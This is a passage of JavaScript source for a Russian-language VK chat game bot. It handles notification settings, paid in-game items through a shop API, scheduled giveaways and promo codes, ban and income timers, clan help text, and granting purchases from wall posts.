    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, уведомления отключены!\n🔕`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	}

if(context.text.includes(`вкл`)) {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.notifications = true
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, уведомления включены!\n🔔`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	}
	if(context.isChat) return
		if(base.bs[base.id[context.senderId].id].tlgrmblock == true) return context.send(`${nick}, Данный аккаунт отключён при помощи 🌀 Telegram, его можно включить написав <<menu>> в Telegram t.me/joraTELEGRAMbot`)
	return context.send(`${nick}, вы находитесь в бане от руки Администратора *id${base.bs[base.bs[base.id[context.senderId].id].bannedby].id} (${base.bs[base.bs[base.id[context.senderId].id].bannedby].nick})\n❓Причина: ${base.bs[base.id[context.senderId].id].banreason}\n⌚ Бан истекает через: ${nols(base.bs[base.id[context.senderId].id].bandays)}:${nols(base.bs[base.id[context.senderId].id].banhours)}:${nols(base.bs[base.id[context.senderId].id].banminutes)}:${nols(base.bs[base.id[context.senderId].id].banseconds)}`)
	
	
	}
	}



if(context.payload.message.attachments[0]) {
	if(context.payload.message.attachments[0].market) {
	if(context.payload.message.attachments[0].market.title == `Межпланетный Экспресс`) {
	const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.express + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}
	if(context.payload.message.attachments[0].market.title == `Киностудия`) {
	const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.studio + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}
	if(context.payload.message.attachments[0].market.title == `Питомец «Жорик»`) {
	const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.jorik + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}
	if(context.payload.message.attachments[0].market.title == `VIP статус`) {
	const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.vip + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}
	if(context.payload.message.attachments[0].market.title == `PREMIUM статус`) {
	const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.premium + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}



}
}

if(context.payload.message.ref == `1` || context.payload.message.ref == 1) {
	return context.send(`${base.bs[base.id[context.senderId].id].nick}, Доступный донат:
1.🎥 Бизнес «Киностудия», один из самых лучших бизнесов, с прибылью в 25,000,000,000$
🔹Продать бизнес можно за 25,000,000,000,000$.
🔸Цена: 49₽. Для покупки введите: «донат 1» 🎁

2.💼 Бизнес «Межпланетный Экспресс», самый лучший бизнес, с прибылью в 300,000,000,000$
🔹Продать бизнес можно за 125,000,000,000,000$.
🔸Цена: 289₽. Для покупки введите: «донат 2» 🎁

3.🐑 Питомец «Жорик», самый лучший питомец.
🔹При максимальном уровне приносит до 500,000,000,000,000$
??Жорика невозможно потерять в походе
🔹Жорик устаёт всего на 15 минут вместо 60-ти.
🔸Продать Жорика можно за 40,000,000,000,000$
🔸Цена: 95₽. Для покупки введите: «донат 3» 🐰

4.🔮 Статус «Premium», самый лучший донат статус.
🔹Подробное описание здесь: «${premdesc}»
🔸Цена: 450₽. Для покупки введите: «донат 4» 🛍️

5.🔥 Статус «V.i.P», самый дешёвый донат статус.
🔹Подробное описание здесь: «${vipdesc}»
🔸Цена: 95₽. Для покупки введите: «донат 5» 🛍️



`)
	
	
	
	}

if(context.isChat) {
	if(!chats.ids[context.chatId]) {
		chats.ids[context.chatId] = {
			"id": context.chatId,
			"active": 1,
			"message": 0
		}
	}
	chats.ids[context.chatId].message += 1
	if(chats.ids[context.chatId].active == 0) chats.ids[context.chatId].active = 1
	if(chats.ids[context.chatId].active == 3) {
		let choose = getRandomInRange(1, 2)
		chats.ids[context.chatId].active = 0
if(choose == 1) {
setTimeout(() => context.send({chat_id: context.chatId, message: `>> А вы знали, что добавляя [club187706737|Жору] в беседу, Вы получаете крутые награды в виде доната, денег и т.п? 🤑
👇🏻 Быстрее жми на кнопку и скорей добавляй меня!`,
      keyboard: Keyboard.keyboard([
      [ 
            Keyboard.textButton({ 
            label: '📚 Помощь', 
            color: Keyboard.POSITIVE_COLOR,
            payload: {
            	"command": "help"
            }
            })         
            
      ],
     	[
            Keyboard.applicationButton({ 
            label: 'Добавить в беседу', 
            appId: 6441755,
            ownerId: -187706737
            })
      ]
     ])
     .inline(false)
  }), 2000) 

}

if(choose == 2) {
setTimeout(() => context.send({chat_id: context.chatId, message: `🎁 В нашей [club187706737|ГРУППЕ] конкурсы и раздачи каждый день! Подпишись и получи шанс выиграть крутые призы `,
      keyboard: Keyboard.keyboard([
      [ 
            Keyboard.textButton({ 
            label: 'vk.com/bot_jopa', 
            color: Keyboard.POSITIVE_COLOR,
            payload: {
            	"command": "help"
            }
            })         
            
      ]
     ])
     .inline(true)
  }), 2000) 

}

	}
}
try {

        await next();
 } catch (err) { console.error(err)
                error = `${error} \n \n ${err}`}
    require('fs').writeFileSync('./base.json', JSON.stringify(base, null, '\t'));
});



/*=========================================================================================*/

vk.updates.use(async (message, next) => {

    // комментарий оставь
    await next(); 
});


setInterval(updateWidget, 10500);

setInterval(function(){ 
for(let b in base.bs){
if(base.bs[b].bonus > 0){
base.bs[b].bonus -= 1;
}
}
}, 1000); // bonus

setInterval(function(){ 
for(let b in base.bs){
if(base.bs[b].pettimer > 0){
base.bs[b].pettimer -= 1;
}
}
}, 60000); // bonus

setInterval(function(){ 
for(let b in base.bs){
if(base.bs[b].potioneffecttime > 0){
base.bs[b].potioneffecttime -= 1;
}
}
}, 60000); // зелья


setInterval(function(){
	for(let o in base.bs){
		if(base.bs[o].farms > 0){
		base.bs[o].farmtime -= 1;
		if(base.bs[o].farmtime < 1){
			base.bs[o].farmtime = 3600;
			if(base.bs[o].farmid == 1){
				let btc = base.bs[o].farms
				btc *= 2
				if(base.bs[o].rank > 2) {
					let pbtc = btc
					pbtc /= Number(2)
					pbtc = Math.trunc(pbtc)
					btc += Number(pbtc)
				}
				base.bs[o].farm_btc += btc
			}
			if(base.bs[o].farmid == 2){
				let btc = base.bs[o].farms
				btc *= 10
				if(base.bs[o].rank > 2) {
					let pbtc = btc
					pbtc /= Number(2)
					pbtc = Math.trunc(pbtc)
					btc += Number(pbtc)
				}
				base.bs[o].farm_btc += btc
			}
			if(base.bs[o].farmid == 3){
				let btc = base.bs[o].farms
				btc *= 100
				if(base.bs[o].rank > 2) {
					let pbtc = btc
					pbtc /= Number(2)
					pbtc = Math.trunc(pbtc)
					btc += Number(pbtc)
				}
				base.bs[o].farm_btc += btc
			}
		}
	}
}
}, 1000); // farm btc

setInterval(function (){
for(let a in base.bs){
base.bs[a].givetime -= 1;
if(base.bs[a].givetime < 1){
base.bs[a].givetime = 1440
base.bs[a].givelimit = 0
}
}
}, 60000);


setInterval(function (){
for(let a in base.bs){
base.bs[a].paytime -= 1;
if(base.bs[a].paytime < 1){
base.bs[a].paytime = 1440
base.bs[a].paylimit = 0
}
}
}, 60000);

setInterval(function (){
for(let o in base.bs){
if(!Number(base.bs[o].balance)) {
base.bs[o].balance = Number(100000)
}
if(base.bs[o].balance < 0) {
base.bs[o].balance = Number(0)
}
}
}, 60000); //anticheat

setInterval(function (){
let hour = new Date().getHours()
let minute = new Date().getMinutes()
let second = new Date().getSeconds()
let o = `${nols(hour)}:${nols(minute)}`
if(o == `00:00`) {
for(let i in logs){
	delete logs[i]
}
vk.api.messages.send({chat_id: adminchat, message: `👥 Логи всех пользователей были обнулены!`})
vk.api.messages.send({chat_id: modchat, message: `👥 Логи всех пользователей были обнулены!`})
	let top = []
	for(let i in base.bs){
		if(base.bs[i].ref !== 0){
			top.push({
				id: base.id[base.bs[i].id].id,
				ref: base.bs[i].refs
			})
		}
	}

	top.sort(function(a, b) { 
		if (b.ref > a.ref) return 1 
		if (b.ref < a.ref) return -1 
		return 0
	}); //Сортировка

	let idb = Number(getRandomInRange(5000000000000, 25000000000000))

	base.bs[top[0].id].balance += idb
	vk.api.messages.send({
		user_id: base.bs[top[0].id].id,
		message: `Т.к вы в топе №1 - по рефералам, вам было выдано: ${utils.sp(idb)}$`
	})

}
if(o == `23:30`) {
vk.api.messages.send({chat_id: adminchat, message: `👥 Логи всех пользователей будут обнулены через 30 минут!`})
vk.api.messages.send({chat_id: modchat, message: `👥 Логи всех пользователей будут обнулены через 30 минут!`})
	}
}, 60000); // 00:00:00:00

setInterval(function (){
for(let a in base.bs){
if(base.bs[a].banned == true) {
if(base.bs[a].banseconds !== 0) {
base.bs[a].banseconds -= Number(1);
if(base.bs[a].banseconds == 0) {
	base.bs[a].banned = false
	vk.api.messages.send({user_id: base.bs[a].id, message: `🔔 Срок бана истёк, приятной игры! 😇`})
}
}
}
}
}, 1000); // бан секунд

setInterval(function (){
for(let a in base.bs){
if(base.bs[a].banned == true) {
if(base.bs[a].banminutes !== 0) {
base.bs[a].banminutes -= Number(1);
if(base.bs[a].banminutes == 0) {
base.bs[a].banned = false
	vk.api.messages.send({user_id: base.bs[a].id, message: `🔔 Срок бана истёк, приятной игры! 😇`})
}
}
}
}
}, 60000); // бан минут

setInterval(function (){
	for(let i in base.bs){
		if(base.bs[i].rank === 1){
			if(base.bs[i].energy !== 10){
				base.bs[i].energy += 1
			}
		}
		if(base.bs[i].rank === 2){
			if(base.bs[i].energy !== 15){
				base.bs[i].energy += 1
			}
		}
		if(base.bs[i].rank === 3){
			if(base.bs[i].energy !== 20){
				base.bs[i].energy += 1
			}
		}
		if(base.bs[i].rank === 4){
			if(base.bs[i].energy !== 25){
				base.bs[i].energy += 1
			}
		}
		if(base.bs[i].rank === 5){
			if(base.bs[i].energy !== 30){
				base.bs[i].energy += 1
			}
		}
	}
}, 300000); // бан минут

setInterval(function (){
for(let a in base.bs){
if(base.bs[a].banned == true) {
if(base.bs[a].banhours !== 0) {
base.bs[a].banhours -= Number(1);
if(base.bs[a].banhours == 0) {
base.bs[a].banned = false
	vk.api.messages.send({user_id: base.bs[a].id, message: `🔔 Срок бана истёк, приятной игры! 😇`})
}
}
}
}
}, 3600000); // бан часов

setInterval(function (){
for(let a in base.bs){
if(base.bs[a].banned == true) {
if(base.bs[a].bandays !== 0) {
base.bs[a].bandays -= Number(1);
if(base.bs[a].bandays == 0) {
base.bs[a].banned = false
	vk.api.messages.send({user_id: base.bs[a].id, message: `🔔 Срок бана истёк, приятной игры! 😇`})
}
}
}
}
}, 86400000); // бан дней

setInterval(function (){
for(let o in base.bs){
if(base.bs[o].biznesid > 0){
let plus = Number(base.bs[o].biznespribil)
if(base.bs[o].biznesworkers < base.bs[o].biznesmaxworkers){
plus /= Number(2)
plus = Math.floor(plus)
}
base.bs[o].biznesmoney += Number(plus)
}
}
}, 3600000); // бизнесы

setInterval(function (){
let hour = new Date().getHours()
let minute = new Date().getMinutes()
let second = new Date().getSeconds()
let o = `${nols(hour)}:${nols(minute)}`
if(o == `00:00`) {
	for(let i in clan){
		for(let j in clan[i].moneytime){
			delete clan[i].moneytime[j]
		}
	}
}
}, 60000); // обнуление списка казны клана


setInterval(function (){
chats.timer -= 1;
if(chats.timer < 1) {
chats.timer = 15
for(let b in chats.ids){
if(chats.ids[b].active !== 1) return
chats.ids[b].active = 3
}
}
}, 60000); // авто-уведомление в беседу



setInterval(function (){
let resphoto = `photo-187706737_457239042`
let hour = new Date().getHours()
let minute = new Date().getMinutes()
let second = new Date().getSeconds()
let time = `${nols(hour)}:${nols(minute)}`
let type = base.context.giveawaytype
if(time == `12:00`) {
	if(base.context.lastgiveawayid !== 0) {
		let reposts = 0
		page.api.wall.getReposts({owner_id: -187706737, post_id: base.context.lastgiveawayid, count: 1000}).then((res) => {
			reposts = res.profiles
			for(let r in reposts){
				if(!base.id[reposts[r].id]) return
					let uid = base.id[reposts[r].id].id
				if(type == 1) {
					base.bs[uid].btc += Number(500000)
					vk.api.messages.send({user_id: reposts[r].id, message: `🎉 Вы получили +500,000₿ биткоинов за участие в раздаче!`})
				} // 500,000 Биткоинов
				if(type == 2) {
					base.bs[uid].btc += Number(500000)
					vk.api.messages.send({user_id: reposts[r].id, message: `🎉 Вы получили +250,000,000,000$ за участие в раздаче!`})
				} // 250,000,000,000 Долларов
				if(type == 3) {
					base.bs[uid].farms += Number(50)
					vk.api.messages.send({user_id: reposts[r].id, message: `🎉 Вы получили 50 Биткоин ферм 🔋 за участие в раздаче!`})
				} // 50 Биткоин Ферм
			} // выдача награды

		}) // получение репостов
	} // проверка на запись с раздачей

let givetype = getRandomInRange(1, 6)
let givetext = ``
base.context.giveawaytype = Number(givetype)
if(givetype == 1) {
	page.api.wall.post({owner_id: -187706737, attachment: resphoto, message: `📢 Началась новая раздача!
✅ Репостните эту запись и получите 500,000₿ биткоинов на свой игровой баланс! Раздача будет длиться ровно сутки.`}).then((res) => {
base.context.lastgiveawayid = Number(res.post_id)
for(let m in base.bs){
if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n`, })
}		
}
})
} // раздача #1

if(givetype == 2) {
	page.api.wall.post({owner_id: -187706737, attachment: resphoto, message: `📢 Началась новая раздача!
✅ Репостните эту запись и получите 250.000.000.000$ на свой игровой баланс! Раздача будет длиться ровно сутки.`}).then((res) => {
base.context.lastgiveawayid = Number(res.post_id)
for(let m in base.bs){
if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n`, })
}		
}
})
} // раздача #2


if(givetype == 3) {
	page.api.wall.post({owner_id: -187706737, attachment: resphoto, message: `⏳ Началась новая раздача!
✅ Поделитесь это записью и получите 50 биткоин ферм! Раздача будет длиться ровно сутки.`}).then((res) => {
base.context.lastgiveawayid = Number(res.post_id)
for(let m in base.bs){

if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n📢 Началась новая раздача!\n`, })
}		
}
})
} // раздача #3

if(givetype == 4) {
	let colves = getRandomInRange(10, 100)
	base.context.promotype = Number(1)
	base.context.promocolves = Number(colves)
	page.api.wall.post({owner_id: -187706737, message: `⏳ Новый промокод!
▶ Отправь боту промокод «Промо Жора» чтобы получить 5 биткоин фермы! 😯
❗ Лимит активаций: ${colves}`}).then((res) => {
base.context.lastgiveawayid = Number(0)
for(let m in base.bs){
	base.bs[m].promoactive = false
if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n`, })
}		
}
})
} // промокод #1


if(givetype == 5) {
	let colves = getRandomInRange(10, 100)
	base.context.promotype = Number(2)
	base.context.promocolves = Number(colves)
	page.api.wall.post({owner_id: -187706737, message: `⏳ Новый промокод!
▶ Отправь боту промокод «Промо Жора» чтобы получить чтобы получить 100.000₿ на свой игровой счёт! 
❗ Лимит активаций: ${colves}`}).then((res) => {
base.context.lastgiveawayid = Number(0)
for(let m in base.bs){
	base.bs[m].promoactive = false
if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n`, })
}		
}
})
} // промокод #2

if(givetype == 6) {
	let colves = getRandomInRange(10, 100)
	base.context.promotype = Number(3)
	base.context.promocolves = Number(colves)
	page.api.wall.post({owner_id: -187706737, message: `⏳ Новый промокод!
▶ Отправь боту промокод «Промо Жора» чтобы получить 50.000.000.000$ на банковский счёт! ☺ 
❗ Лимит активаций: ${colves}`}).then((res) => {
base.context.lastgiveawayid = Number(0)
for(let m in base.bs){
	base.bs[m].promoactive = false
if(base.bs[m].notifications == true) {
	vk.api.messages.send({user_id: base.bs[m].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let z in chats.ids){
	if(chats.ids[z].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[z].id, attachment: `wall-187706737_${res.post_id}`, message: `[УВЕДОМЛЕНИЕ]\n⏳ Новый промокод!\n`, })
}		
}
})
} // промокод #3


}
}, 60000); // авто-раздачи

updates.hear(/промо Жора|промокод Жора|промо Жорик|промокод Жора$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(base.context.promotype < 1) return context.send(`${nick}, промокод не найден, либо вы уже активировали его`)
if(base.context.promocolves < 1) return context.send(`$${nick}, этот промокод больше нельзя активировать`)
if(user.promoactive == true) return context.send(`${nick}, промокод не найден, либо вы уже активировали его`)
user.promoactive = true 
base.context.promocolves -= Number(1)
context.send(`${nick}, Вы активировали Промокод <<Жорик>>.
⏳ Осталось активаций: ${base.context.promocolves}`)

if(base.context.promotype == 1) user.farms += Number(5)
if(base.context.promotype == 2) user.btc += Number(100000)
if(base.context.promotype == 3) user.balance += Number(50000000000)

}) 
updates.hear(/(клан помощь)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, информация по командам:
		1⃣ Клан — информация о клане.
2⃣ Клан создать [название] — стоимость 100.000.000.000$
3⃣ Клан удалить — распустить клан.
4⃣ Клан пригласить [ID игрока] — пригласить игрока в клан.
5⃣ Клан исключить [ID игрока] — исключить игрока из клана.
6⃣ Клан выйти — выйти из клана.
7⃣ Клан вступить [ID клана] — принять приглашение в клан.
8⃣ Клан топ — рейтинг кланов.
9⃣ Клан казна — история пополнения казны за сутки.
🔟 Клан казна [сумма] — внести деньги в казну клана.
1⃣1⃣ Клан изменить [название] — сменить название.
1⃣2⃣ Клан состав — участники клана.
1⃣3⃣ Клан магазин — покупка войск для клана.
1⃣4⃣ Клан атака — напасть на другой клан.
1⃣5⃣ Клан админ [ID игрока] — выдать админа в клане.
1⃣6⃣ Клан снять [ID игрока] — снять админа в клане.`)
})

vk.updates.on('new_wall_post', async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
   if(context.payload.text.includes(`обнов`)) return
   if(context.payload.text.includes(`раздача`)) return
   if(context.payload.text.includes(`конкурс`)) return
   if(context.payload.text.includes(`привет`)) return
   if(context.payload.text.includes(`изменения`)) return
        if(context.payload.text.includes('biznes21')){
            let tels = context.payload.text.replace(' biznes21', '')
            if(!base.bs[tels]) return page.api.call("wall.delete", {owner_id: -187706737, post_id: context.payload.id})
            vk.api.messages.send({chat_id: adminchat, message: `@id${base.bs[tels].id} купил бизнес 💼 «Межпланетный Экспресс», за 289₽`})
            base.bs[tels].biznesid = Number(21)
            base.bs[tels].biznesname = `Межпланетный экспресс`
            base.bs[tels].biznesworkers = Number(0)
            base.bs[tels].biznesmaxworkers = Number(50000)
            base.bs[tels].biznespribil = Number(300000000000)
            vk.api.messages.send({user_id: base.bs[tels].id, message: `🛍️ Благодарим вас за покупку самого лучшего бизнеса в боте: «💼 Межпланетный экспресс», подробнее: «бизнес» 💰`})
            page.api.call("wall.delete", {
				owner_id: -187706737,
			    post_id: context.payload.id
				})
        
        }
        if(context.payload.text.includes('biznes20')){
            let tels = context.payload.text.replace(' biznes21', '')
            if(!base.bs[tels]) return page.api.call("wall.delete", {owner_id: -187706737, post_id: context.payload.id})
            vk.api.messages.send({chat_id: adminchat, message: `@id${base.bs[tels].id} купил бизнес 🎥 «Киностудия», за 49₽`})
            base.bs[tels].biznesid = Number(20)
            base.bs[tels].biznesname = `Киностудия`
            base.bs[tels].biznesworkers = Number(0)
            base.bs[tels].biznesmaxworkers = Number(20000)
            base.bs[tels].biznespribil = Number(25000000000)
            vk.api.messages.send({user_id: base.bs[tels].id, message: `🛍️ Благодарим вас за покупку одного из самых лучших бизнесов в боте: «🎥 Киностудия», подробнее: «бизнес» 💰`})
            page.api.call("wall.delete", {
				owner_id: -187706737,
			    post_id: context.payload.id
				})
        
        }
        if(context.payload.text.includes('rank3')){
            let tels = context.payload.text.replace(' rank3', '')
            if(!base.bs[tels]) return page.api.call("wall.delete", {owner_id: -187706737, post_id: context.payload.id})
            vk.api.messages.send({chat_id: adminchat, message: `@id${base.bs[tels].id} купил статус «🔮 Premium», за 450₽`})
            base.bs[tels].rank = Number(3)
            vk.api.messages.send({user_id: base.bs[tels].id, message: `🛍️ Благодарим вас за покупку самого лучшего донат статуса в боте: «🔮 Premium», подробнее: «${premdesc}» 💰\n🔸 Напишите: <</premium», Для просмотра команд.`})
            page.api.call("wall.delete", {
				owner_id: -187706737,
			    post_id: context.payload.id
				})
        
        }
    if(context.payload.text.includes('rank2')){
            let tels = context.payload.text.replace(' rank2', '')
            if(!base.bs[tels]) return page.api.call("wall.delete", {owner_id: -187706737, post_id: context.payload.id})
            vk.api.messages.send({chat_id: adminchat, message: `@id${base.bs[tels].id} купил статус «🔥 V.i.P», за 95₽`})
            base.bs[tels].rank = Number(3)
            vk.api.messages.send({user_id: base.bs[tels].id, message: `🛍️ Благодарим вас за покупку самого дешёвого донат статуса в боте: «🔥 V.i.P», подробнее: «${vipdesc}» 💰🔸 Напишите: <</vip, Для просмотра команд.`})
            page.api.call("wall.delete", {
				owner_id: -187706737,
			    post_id: context.payload.id
				})
        
        }
    if(context.payload.text.includes('pet8')){
            let tels = context.payload.text.replace(' pet8', '')
            if(!base.bs[tels]) return page.api.call("wall.delete", {owner_id: -187706737, post_id: context.payload.id})
            vk.api.messages.send({chat_id: adminchat, message: `@id${base.bs[tels].id} купил питомца 🐑 «Жорик», за 95₽`})
            base.bs[tels].petid = Number(8)
            base.bs[tels].petname = `Жорик`
            base.bs[tels].peticon = `🐑`
            base.bs[tels].petlvl = Number(1)
            base.bs[tels].pettimer = Number(0)
            vk.api.messages.send({user_id: base.bs[tels].id, message: `🛍️ Благодарим вас за покупку самого лучше питомца в боте: «🐑 Жорик», подробнее: «питомец» 💰`})
            page.api.call("wall.delete", {
				owner_id: -187706737,
			    post_id: context.payload.id
				})
        
        }
}) // автодонат



